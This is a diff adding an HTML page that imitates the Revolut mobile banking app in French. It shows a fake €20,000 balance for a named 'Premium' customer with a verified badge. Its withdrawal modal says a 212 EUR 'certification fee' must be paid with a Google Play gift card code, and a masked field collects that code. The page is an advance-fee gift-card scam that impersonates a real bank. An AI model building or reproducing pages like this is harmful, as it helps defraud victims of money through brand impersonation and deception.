@@ -1,0 +1,101 @@
+<html><head>
+    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black-translucent"><title>Revolut</title>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="styles.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+</head>
+<body>
+    <header>
+        <div class="header-content">
+            <div class="logo">
+                <img alt="Revolut logo, blue R on white background" src="logo.png" width="30" height="30">
+                <span>Revolut</span>
+            </div>
+            
+        </div>
+    </header>
+
+    <div class="container">
+    <div class="account-overview">
+        <div class="balance">€ <span id="account-balance">20.000,00</span></div>
+        <div class="account-name" id="account-name">Compte courant • EUR</div>
+        <button id="toggle-balance" class="toggle-button">
+            <i id="toggle-icon" class="fas fa-eye"></i> Masquer le solde
+        </button>
+    </div>
+</div>
+
+        <div class="quick-actions">
+            <button class="action-button" id="withdraw-money">
+                <img alt="Withdraw money icon" src="https://cdn-icons-png.flaticon.com/512/2489/2489756.png" width="24" height="24">
+                <span>Retirer</span>
+            </button>
+        </div>
+
+        <div class="user-profile">
+            <img alt="User profile picture" src="blank.jpg" width="64" height="64" class="profile-picture">
+            <div class="profile-info">
+                <h2>
+                    Peter Lindemann
+                    <svg class="verified-badge" width="16" height="16">
+                        <use xlink:href="#verified-badge"></use>
+                    </svg>
+                </h2>
+                <p>Client depuis 2024</p>
+                <p>Statut: Premium</p>
+            </div>
+        </div>
+
+        <div class="transactions">
+            <h3>Transactions récentes</h3>
+            </div>
+
+    <div class="lang-selector">
+        <select id="language-select">
+            <option value="fr">FR</option>
+            <option value="de">DE</option>
+        </select>
+    </div>
+
+    <div class="tab-bar">
+        <a href="#home" class="tab-item active">
+            <img alt="Home icon" src="https://cdn-icons-png.flaticon.com/512/1946/1946488.png" width="24" height="24">
+            <span id="home-tab">Accueil</span>
+        </a>
+        <a href="#cards" class="tab-item">
+            <img alt="Cards icon" src="https://cdn-icons-png.flaticon.com/512/1086/1086741.png" width="24" height="24">
+            <span id="cards-tab">Cartes</span>
+        </a>
+        <a href="#payments" class="tab-item">
+            <img alt="Payments icon" src="https://cdn-icons-png.flaticon.com/512/2921/2921222.png" width="24" height="24">
+            <span id="payments-tab">Paiements</span>
+        </a>
+        <a href="#hub" class="tab-item">
+            <img alt="Hub icon" src="https://cdn-icons-png.flaticon.com/512/3405/3405802.png" width="24" height="24">
+            <span id="hub-tab">Hub</span>
+        </a>
+    </div>
+
+    <div id="withdrawal-modal" class="modal">
+        <div class="modal-content">
+            <h2>Confirmer le retrait</h2>
+            <p>Le retrait des fonds de votre compte authentifié nécessite des frais de certification d'un montant de 212 EUR. Pour procéder au retrait, veuillez fournir un code Google Play d'une valeur équivalente à 212 EUR afin d'initier le processus de retrait.
+
+</p>
+            <input type="password" id="pin-input" maxlength="18">
+            <button id="confirm-withdrawal">Confirmer</button>
+            <button id="cancel-withdrawal">Annuler</button>
+        </div>
+    </div>
+<svg style="display: none;">
+      <symbol id="verified-badge" viewBox="0 0 24 24">
+        <path fill="#0666eb" d="M12,2A10,10 0 0,1 22,12A10,10 0 0,1 12,22A10,10 0 0,1 2,12A10,10 0 0,1 12,2M11,16.5L18,9.5L16.59,8.09L11,13.67L7.91,10.59L6.5,12L11,16.5Z" />
+      </symbol>
+    </svg>
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/i18next/21.6.10/i18next.min.js"></script>
+    <script src="script.js">
+
+    </script>
+</body>
+</html>
